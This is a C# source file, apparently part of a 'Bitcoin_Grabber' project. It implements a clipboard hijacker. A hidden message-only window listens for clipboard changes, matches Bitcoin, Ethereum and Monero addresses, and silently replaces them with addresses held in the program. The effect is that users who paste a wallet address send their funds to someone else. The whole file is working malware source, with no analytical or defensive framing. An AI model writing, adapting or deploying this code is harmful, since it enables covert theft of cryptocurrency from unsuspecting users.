using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace Bitcoin_Grabber
{
	public sealed class ClipboardNotification
	{
		public class NotificationForm : Form
		{
			private static string currentClipboard = ClipboardInteractions.GetText();

			public NotificationForm()
			{
				NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
				NativeMethods.AddClipboardFormatListener(Handle);
			}

			private bool RegexResult(Regex pattern)
			{
				return pattern.Match(currentClipboard).Success;
			}

			protected override void WndProc(ref Message m)
			{
				bool flag = m.Msg == NativeMethods.WM_CLIPBOARDUPDATE;
				if (flag)
				{
					string settext;
					currentClipboard = ClipboardInteractions.GetText();
					bool flag2 = RegexResult(PatternRegex.btc) && !currentClipboard.Contains(Addresses.btc);
					bool flag3 = RegexResult(PatternRegex.ethereum) && !currentClipboard.Contains(Addresses.ethereum);
					bool flag4 = RegexResult(PatternRegex.xmr) && !currentClipboard.Contains(Addresses.xmr);
					if (flag2)
					{
						settext = PatternRegex.btc.Replace(currentClipboard, Addresses.btc);
						ClipboardInteractions.SetText(settext);
					} else if (flag3)
					{
						settext = PatternRegex.ethereum.Replace(currentClipboard, Addresses.ethereum);
						ClipboardInteractions.SetText(settext);
					} else if (flag4)
					{
						settext = PatternRegex.xmr.Replace(currentClipboard, Addresses.xmr);
						ClipboardInteractions.SetText(settext);
					}
				}
				base.WndProc(ref m);
			}
		}
	}
}
